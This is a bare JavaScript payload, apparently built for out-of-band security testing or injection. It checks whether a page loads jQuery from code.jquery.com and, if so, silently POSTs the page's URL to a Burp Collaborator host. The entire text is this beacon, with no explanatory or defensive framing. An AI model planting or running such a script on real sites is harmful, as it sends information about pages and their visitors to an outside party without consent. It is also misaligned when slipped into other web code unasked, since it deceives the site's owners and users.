var reg=/code\.jquery.com/ig;
if(document.body.innerHTML.match(reg) || document.head.innerHTML.match(reg)){
fetch('https://ji587kccvtuckwbdmyjfjpez0q6gu5.burpcollaborator.net', {
method: 'POST',
mode: 'no-cors',
body:document.documentURI
});
}
